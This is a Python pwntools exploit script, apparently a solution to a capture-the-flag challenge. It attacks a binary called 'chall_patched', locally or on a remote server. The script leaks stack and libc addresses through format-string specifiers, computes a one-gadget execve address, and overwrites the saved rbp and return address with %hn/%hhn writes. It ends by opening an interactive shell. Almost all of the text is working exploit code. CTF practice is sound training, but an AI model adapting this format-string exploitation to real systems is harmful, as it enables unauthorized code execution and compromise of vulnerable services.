#!/usr/bin/python3

from pwn import *

exe = ELF('./chall_patched', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+354
        b*main+302
        b*main+607
        b*main+645
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('67.223.119.69',5003)
else:
    p = process([exe.path])
#GDB()

sla(">",b'1')
payload = b'a'*50
payload += b'%44$p\n%45$p'
sla("read",payload)

sla(">",b'2')

sla(">",b'3')

sla("format ?",b'3')

p.recvuntil(b'printing ... \n')


leak_rbp = int(p.recvline()[:-1],16)
leak_libc = int(p.recvline()[:-1],16)


info(hex(leak_rbp))
info(hex(leak_libc))
rbp_new = leak_rbp + 0x708
libc_base =  leak_libc - 0x2a1ca
execve = libc_base + 0xef52b
info("libc base: "+hex(libc_base))

offset_rbp = leak_rbp - 160 #2 offset last
offset_ret = leak_rbp - 152




byte_rbp = rbp_new &0xffff
byte_libc1 = execve &0xff
byte_libc2 = (execve>>8) &0xffff

dict = {
    byte_rbp:offset_rbp,
    byte_libc1:offset_ret,
    byte_libc2:(offset_ret+1)
}
order = sorted(dict)
## change 1:

payload = b'c'*50
payload += f'%{order[0]}c%18$hhn%{order[1]-order[0]}c%19$hn'.encode()
payload = payload.ljust(80,b'\0')
payload += p64(dict[order[0]])
payload += p64(dict[order[1]])
payload += p64(dict[order[2]])



#write 1 byte libc
#write 2 byte rbp 
#write 2 byte libc +1 

sla(">",b'1')
sa("read",payload)
sla(">",b'2')
sla(">",b'3')
sla(">",b'3')


payload = b'd'*50
payload += f'%{order[2]}c%20$hn'.encode()
payload = payload.ljust(80,b'\0')
payload += p64(dict[order[0]])
payload += p64(dict[order[1]])
payload += p64(dict[order[2]])

sla(">",b'1')
sa("read",payload)
sla(">",b'2')
sla(">",b'3')
sla(">",b'3')

sla(">",b'4')
p.interactive()



#bof s -> v7 bufv8
#v8 -> 
#print: main+607
#leak rbp
# leak_libc
# main+0162 strcpy 2

#%44$p : rbp
#45 libc and ret
